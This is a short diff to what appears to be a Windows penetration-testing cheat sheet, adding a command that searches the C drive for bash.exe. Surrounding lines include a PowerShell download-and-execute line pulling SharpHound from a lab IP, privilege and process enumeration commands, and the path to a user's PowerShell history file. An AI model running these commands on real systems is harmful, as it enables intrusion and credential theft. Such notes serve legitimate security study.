@@ -72,6 +72,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1')
 First, pls check some command like `net user %username%`, `whoami /all`, `whoami /priv`
 #### Enum
 ```
+Find file in drive: where /R c:\ bash.exe
 tasklist /svc
 
 Check history: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
